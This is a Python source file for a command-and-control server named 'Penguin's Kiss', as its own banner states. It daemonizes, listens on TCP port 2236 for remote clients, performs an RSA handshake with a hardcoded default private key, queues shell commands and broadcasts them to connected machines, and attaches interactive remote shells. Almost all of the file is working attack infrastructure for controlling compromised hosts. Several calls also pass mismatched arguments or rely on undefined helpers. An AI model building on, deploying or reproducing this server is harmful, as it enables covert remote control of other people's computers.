import os, sys, socket, signal, json, selectors

# initial crypto config
SERVER_PROMPT = b'pk> '
CONNECTED_PROMPT = b'$ '
DEFAULT_PRIVKEY = {
    'n' : 566985700738319622174686131400034453643720466970978517574628629274979976524124940713860540038882426013024114564601644133774454954579859603022526047211561634473245368041734849645333850659593387029777461624139999293346678168096585398894872902836488432305321788895930893995350254306011511954048973993218576068120842406854381660868440914954041085267631248545101914138883676131275460708745009456577214046268195248043933401098454229528930264593554947172986600022924103676180205323189749504546460222696144254434950563003806500524021358243739253925888283568187475109036444929999292467231057057868003949542201486910774286204467263359268168124928585201908563486221036238676222817747434022603388355897696091620276281574099795985472307965135468502881374317279001616973398539298555877212283138431306761372378738101671232030286096798836533645647014376468992868000495595560982785914820504104078715279785802300066599327401921364225207587243296778060887445799525002269634182195900334989318967452442166075135355126785800284396564017524632233821326493688824504309419677467169118434525079593731269479730143537689127087750148171355493757239210404790175123435648784211703985569364347710928586741341454862278795609365544396160373248258804813219121521794117,
    'd': 556837628245436992258594353745698118228243955874087329373840686858641854357062082245249550621215930968800587604498530952381998240636252551824799220329355219818361610519831879130449485998047954022683316904590489563406405444426333561415224980059626492773543671826566612159798644554253703334153350963570508721005384754791574549035450677481451705329292120197093849300930908197101084167076060678138086956589500876529284670160381281251812984272999536442652387565428490913738235430699986833553997982416263008566934068345774167260144814410181017435736659956708708789203377351335496900390004981500773703531352617659109757194578984857180398552528891333113022224791018685454843296797667603791554700637297860618002492108978467427456668104433428337512441346843300723241861425217786682449652009806902779786726468810049128846369952153062504613238668046106715766225913013878725374564881609360260298003325733625331843908626880708147525900261607013505358791540629330161310254014903842144797601317221440909449161962394110410342659474869213071878556273369065034348504204889807185950624322995301874762713559375336446823625047623366082274935910850205164805850493608044771494978419878162374325380208609212967302669554969905283343054612922077635187252461953,
}

def betterstr(obj):
    if type(obj) == str:
        return obj
    return str(obj, 'utf-8') if type(obj) == bytes else str(obj)

def prompt_str():
    global tcp_clients
    return CONNECTED_PROMPT if len(tcp_clients) > 0 else SERVER_PROMPT

def motd():
    mstr = '################################################################################\n'\
         + '#                                Penguin\'s Kiss                                #\n'\
         + '#                                         _,\u2764                                  #\n'\
         + '#                                  _.--""\'/                                    #\n'\
         + '#                                 )-._.-\)                                     #\n'\
         + '#                          Command & Control Software                          #\n'\
         + '#                    Contact cflems@cflems.net for support.                    #\n'\
         + '################################################################################\n'
    return bytes(mstr, 'utf-8')

def showcrypto():
    global privkey
    return '[warcrypto] Server public key:\n{"n": %d, "e": %d}' % (privkey['n'], privkey['e'])

def dispatch_command(sock, command, rpubkey):
    global bits
    send_encrypted(sock, command, rpubkey['e'], rpubkey['n'], bits=bits)

def dispatch_ccmd(client, command):
    dispatch_command(client['sock'], command, client['pubkey'])

def brint(*args, sep=' ', end='\n', prompt=True):
    s = '%s%s' % (sep.join(map(lambda s: betterstr(s), args)), end)
    bnnl(s, logging=prompt)

def bnnl(s, logging=False):
    sys.stdout.write(betterstr(s))
    sys.stdout.flush()
    broadcast_screens(s, sv_prompt=logging, ctd_prompt=logging)

def broadcast_screens(s, skip=set(), sv_prompt=False, ctd_prompt=False):
    global screens, tcp_clients
    if type(s) != bytes:
        s = bytes(s, 'utf-8')

    i = 0
    while i < len(screens):
        if screens[i]['sock'] in skip or screens[i]['pty']:
            i += 1
            continue
        try:
            screens[i]['sock'].sendall(s)
            if sv_prompt and len(tcp_clients) < 1:
                screens[i]['sock'].sendall(SERVER_PROMPT)
            if ctd_prompt and len(tcp_clients) > 0:
                screens[i]['sock'].sendall(CONNECTED_PROMPT)
            i += 1
        except:
            screens_detach(screens[i])

def blast_command(cmd, orig_screen, targets=set()):
    global cmdq
    tstr = betterstr(targets)
    if tstr == 'set()':
        tstr = 'all clients'
    print('[INFO] Blasting command: %s to %s.' % (betterstr(cmd), tstr))
    if type(cmd) != bytes:
        cmd = bytes(cmd, 'utf-8')

    broadcast_screens(cmd+b'\n', skip={orig_screen['sock']}, sv_prompt=True, ctd_prompt=False)

    wildcard = len(targets) < 1
    if wildcard:
        cmdq.append(cmd)

    i = 0
    while i < len(tcp_clients):
        try:
            if tcp_clients[i]['pty']:
                i += 1
                continue
            if wildcard or i in targets:
                dispatch_ccmd(tcp_clients[i], cmd)
            if wildcard:
                tcp_clients[i]['qidx'] += 1
            i += 1
        except:
            tcp_disconnect(tcp_clients[i])

def cliinfo(clients):
    try:
        info = ''
        i = 0
        while i < len(clients):
            record = {}
            record['ip'] = clients[i]['addr'][0]
            record['rport'] = clients[i]['addr'][1]
            try:
                record['rdns'] = socket.getnameinfo(clients[i]['addr'], 0)[0]
            except:
                pass
            info += '- %d: %s\n' % (i, str(record))
            i += 1
        info += '[pk] %d total.' % i
        return info
    except Exception as e:
        return repr(e)

def screens_detach(sel, screen):
    global screens
    sel.unregister(screen['sock'])
    screen['sock'].close()
    screen['alive'] = False

    if screen in screens:
        idx = screens.index(screen)
        del screens[idx]
        brint('[INFO] Screen detaching: %d' % idx)

def screens_pty(sel, screen, client):
    screen['pty'] = client
    client['pty'] = screen
    client['osc'] = OutStreamCipher(client['sock'], client['pubkey'], bits=bits)
    client['isc'] = InStreamCipher(client['sock'], privkey, bits=bits)

    try:
        dispatch_ccmd(client, b'pty')
        if 'TERM' not in os.environ:
            os.environ['TERM'] = 'xterm-256color'
        client['osc'].send(bytes(os.environ['TERM'], 'utf-8'))
    except:
        tcp_unpty(sel, client, catchup=False)
        tcp_disconnect(sel, client)
    
    try:
        screen['sock'].sendall(b'\xc0\xdepty')
    except:
        screens_detach(sel, screen)
        tcp_send_npty(sel, client)
        return

def screens_read(sel, sock, screen):
    global cmdq, tcp_clients, screens, privkey, bits
    if not screen['alive']:
        return
    try:
        data = sock.recv(1024)
    except:
        data = False
    if not data or data == b'\xde\xad':
        screens_detach(sel, screen)
        if screen['pty']:
            tcp_send_npty(sel, screen['pty'])
        return

    if screen['pty']:
        try:
            screen['pty']['osc'].send(data)
        except:
            tcp_unpty(sel, client, catchup=False)
            tcp_disconnect(sel, client)
        return

    data = data.strip().split(b'\n')
    for cmd in data:
        resp, shcmd = '', False
        if not screen['alive']:
            return
        elif cmd == b'':
            continue
        elif cmd == b'\xde\xad':
            screens_detach(sel, screen)
            return
        elif cmd == b'nscreen':
            resp = 'Active screens: %d' % len(screens)
        elif cmd == b'ncli':
            resp = 'Active TCP clients: %d' % len(tcp_clients)
        elif cmd == b'lcli':
            resp = 'Active TCP clients:\n%s' % cliinfo(tcp_clients)
        elif cmd == b'lq':
            resp = '[%s]' % ', '.join(map(lambda s : repr(betterstr(s)), cmdq))
        elif cmd == b'cq':
            cmdq.clear()
            for client in tcp_clients:
                client['qidx'] = 0
        elif cmd == b'show-serverkey':
            resp = showcrypto()
        elif cmd == b'\xc0\xdeprompt':
            pass
        elif cmd == b'pty':
            resp = '[pk] Must specify a client to connect to via PTY.'
        elif cmd[:4] == b'pty ':
            try:
                cn = int(cmd[4:])
            except:
                cn = -1
            if cn < 0 or cn >= len(tcp_clients):
                resp = '[pk] Cannot attach PTY to invalid TCP client.'
            else:
                client = tcp_clients[cn]
                screens_pty(sel, screen, client)
                return
        else:
            shcmd = True
            targets = set()
            if cmd[:7] == b'TARGET=':
                if b' ' in cmd:
                    sep = cmd.index(b' ')
                    for tval in cmd[7:sep].split(b','):
                        try:
                            targets.add(int(tval))
                        except:
                            resp += '[pk] Invalid target: %s. Must be an integer.\n' % tval
                    cmd = cmd[sep+1:]
                    resp = resp.strip()
                else:
                    resp = '[pk] Can\'t target null command.'
            blast_command(cmd, screen, targets=targets)
        try:
            if len(resp) > 0:
                screen['sock'].sendall(bytes('%s\n' % resp, 'utf-8'))
            if len(tcp_clients) < 1:
                screen['sock'].sendall(SERVER_PROMPT)
            elif not shcmd:
                screen['sock'].sendall(CONNECTED_PROMPT)
        except Exception as e:
            print('[ERROR] Sending command result produced:', repr(e))
            screens_detach(sel, screen)
            return

def screens_init(sel, sock, screen):
    try:
        sock.sendall(motd()+b'\n')
        sock.sendall(prompt_str())
    except Exception as e:
        print('[ERROR] Sending MOTD to screen produced: %s' % repr(e))
        screens_detach(sel, screen)

def screens_close(sock, screen):
    try:
        sock.sendall(b'\xde\xad')
    except:
        pass

def screens_accept(sel, sock):
    global screens
    try:
        ss, _ = sock.accept()
    except:
        print('[WARNING] Error accepting screen attachment.')
        return
    
    screen = {
        'alive': True,
        'pty': False,
        'sock': ss
    }
    screens.append(screen)
    sel.register(ss, selectors.EVENT_READ, {'callback': screens_read, 'close': screens_close, 'args': [screen]})
    screens_init(sel, ss, screen)

def register_screens(sel, socket_file):
    global alive
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        oldmask = os.umask(0o002)
        sock.bind(socket_file)
        os.umask(oldmask)
        sock.listen(5)
    except:
        print('[FATAL] Unable to bind socket file.')
        alive = False
        return
    sel.register(sock, selectors.EVENT_READ, screens_accept)

def tcp_disconnect(sel, client):
    global tcp_clients
    if client not in tcp_clients:
        return

    sel.unregister(client['sock'])
    client['sock'].close()
    client['alive'] = False
    idx = tcp_clients.index(client)
    del tcp_clients[idx]
    brint('[INFO] TCP Client %d disconnected.' % idx)

def tcp_dumpq(sel, client):
    global cmdq
    while client['alive'] and client['qidx'] < len(cmdq):
        try:
            dispatch_ccmd(client, cmdq[client['qidx']])
            client['qidx'] += 1
        except:
            tcp_disconnect(sel, client)

def tcp_send_npty(sel, client):
    try:
        client['osc'].send(b'\xc0\xdenpty')
    except:
        tcp_disconnect(sel, client)

def tcp_unpty(sel, client, catchup=True):
    if type(client['pty']) == dict:
        client['pty']['pty'] = False
        if client['pty']['alive']:
            try:
                client['pty']['sock'].sendall(b'\xc0\xdenpty')
            except:
                screens_detach(sel, client['pty'])
        
    try:
        client['osc'].send(b'\xc0\xdeack')
    except:
        tcp_disconnect(sel, client)
    # this will become stop_stream(backtrack)
    del client['isc']
    del client['osc']
    client['pty'] = False

    if catchup:
        tcp_dumpq(sel, client)

def tcp_transport(sel, sock, client):
    global tcp_clients, privkey, bits
    if not client['alive']:
        return
    try:
        data = client['isc'].recv() if client['pty'] else\
                recv_encrypted(sock, privkey['d'], privkey['n'], bits=bits)
    except:
        data = False
    if not data or data == b'\xde\xad':
        if client['pty']:
            tcp_unpty(sel, client, catchup=False)
        tcp_disconnect(sel, client)
        return
    elif not client['pty']:
        brint('[%d]' % tcp_clients.index(client), data, end='', prompt=False)
    elif data[:6] == b'\xc0\xdenpty':
        tcp_unpty(sel, client, catchup=True)
        print('[INFO] npty acknowledged')
    else:
        try:
            client['pty']['sock'].sendall(data)
        except:
            screens_detach(sel, client['pty'])
            tcp_send_npty(client)

def tcp_handshake(sock):
    global privkey, bits, exp
    nbytes, headsz = bits//8, 2
    rnbytes = int.from_bytes(sock.recv(headsz), 'big')
    sock.sendall(nbytes.to_bytes(headsz, 'big'))

    if rnbytes != nbytes:
        brint('[ERROR] nbytes mismatch with client: %d vs %d' % (rnbytes, nbytes))
        return False

    rpubkey = { 'n': int.from_bytes(recv_encrypted(sock, privkey['d'], privkey['n'], bits=bits),\
                'big'), 'e': exp }

    return rpubkey

def tcp_close(sock, client):
    try:
        dispatch_ccmd(client, b'tunnel')
    except:
        pass

def tcp_accept(sel, sock):
    global tcp_clients
    try:
        cs, ca = sock.accept()
    except:
        print('[WARNING] Error accepting TCP client.')
        return

    client = {
        'alive': True,
        'sock': cs,
        'addr': ca,
        'qidx': 0,
        'pty': False
    }
    try:
        rpk = tcp_handshake(cs)
    except:
        rpk = False
    finally:
        pass
    if not rpk:
        brint('[WARNING] TCP handshake failed from', client['addr'])
        cs.close()
        return
    client['pubkey'] = rpk

    tcp_clients.append(client)
    sel.register(cs, selectors.EVENT_READ, {'callback': tcp_transport, 'close': tcp_close, 'args': [client]})
    brint('[INFO] Connection from', ca[0], 'over TCP.', prompt=False)
    tcp_dumpq(sel, client)

def register_tcp(sel, port):
    if port < 1:
        brint('[INFO] TCP listener disabled.')
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', port))
        sock.listen(5)
    except:
        brint('[WARNING] Error binding TCP socket, TCP listener will now die.')
        sock.close()
        return

    sel.register(sock, selectors.EVENT_READ, tcp_accept)
    print('[INFO] TCP listener started on port %d' % port)

def stopsig(*args):
    global alive, breaker
    alive = False
    print('[INFO] Received stop signal, shutting down.')
    breaker.send(b'\xde\xad')

def defaultint(s, default=0):
    try:
        return int(s)
    except:
        return default

def main(args):
    # initialize server
    if len(args) < 3:
        print('[FATAL] Insufficient arguments.')
        sys.exit(1)

    global bits
    socket_file = args[0]
    pid_file = args[1]
    log_file = args[2]
    bits = defaultint(args[3], 4096) if len(args) > 3 else 4096
    tcp_port = defaultint(args[4], 2236) if len(args) > 4 else 2236
    key_file = args[5] if len(args) > 5 else None

    if os.path.exists(pid_file):
        print('[FATAL] Another PK instance is already running.')
        sys.exit(1)

    try:
        logfd = os.open(log_file, os.O_WRONLY | os.O_APPEND | os.O_CREAT, mode=0o644)
    except:
        print('[FATAL] Unable to open log file.')
        sys.exit(1)

    cpid = os.fork()
    if cpid > 0:
        sys.exit(0)
    elif cpid < 0:
        print('[FATAL] Failed to fork PK daemon process.')
        os.close(logfd)
        sys.exit(1)

    sys.stdin.close()
    os.dup2(logfd, sys.stdout.fileno())
    os.dup2(logfd, sys.stderr.fileno())
    os.close(logfd)

    try:
        pidf = open(pid_file, 'w')
        pidf.write('%d' % os.getpid())
        pidf.close()
    except:
        print('[FATAL] Could not open pid file.')
        os.close(sys.stdout.fileno())
        os.close(sys.stderr.fileno())
        sys.exit(1)

    if os.path.exists(socket_file):
        try:
            os.remove(socket_file)
        except:
            print('[FATAL] Socket file exists and daemon doesn\'t have permission to clear it.')
            os.close(sys.stdout.fileno())
            os.close(sys.stderr.fileno())
            os.remove(pid_file)
            sys.exit(1)

    global privkey, exp
    privkey = DEFAULT_PRIVKEY
    if key_file:
        try:
            with open(key_file, 'r') as kf:
                kj = json.load(kf)
                privkey = {'n': int(kj['n']), 'd': int(kj['d']), 'e': int(kj['e']) if 'e' in kj else exp}
        except:
            pass


    global alive, screens, tcp_clients, cmdq, breaker
    alive = True
    screens = []
    tcp_clients = []
    cmdq = []
    sel = selectors.DefaultSelector()
    breakee, breaker = socket.socketpair()
    sel.register(breakee, selectors.EVENT_READ, None)
    signal.signal(signal.SIGTERM, stopsig)
    print('[INFO] Daemon started successfully.')

    #register_dns(sel)
    register_tcp(sel, tcp_port)
    register_screens(sel, socket_file)

    while alive:
        events = sel.select()
        for evt, _ in events:
            if not alive:
                break
            if type(evt.data) == dict:
                evt.data['callback'](sel, evt.fileobj, *evt.data['args'])
            elif evt.data:
                evt.data(sel, evt.fileobj)

    print('[INFO] Unregistering event handlers.')
    handlers = sel.get_map()
    descriptors = list(handlers.keys())
    for fd in descriptors:
        fo = handlers[fd].fileobj
        data = handlers[fd].data
        if type(data) == dict and 'close' in data:
            data['close'](fo, *data['args'])
        sel.unregister(fo)
        fo.close()

    sel.close()
    os.remove(pid_file)
    os.remove(socket_file)
    os.close(sys.stdout.fileno())
    os.close(sys.stderr.fileno())
    sys.exit(0)

if __name__ == '__main__':
    main(sys.argv[1:])
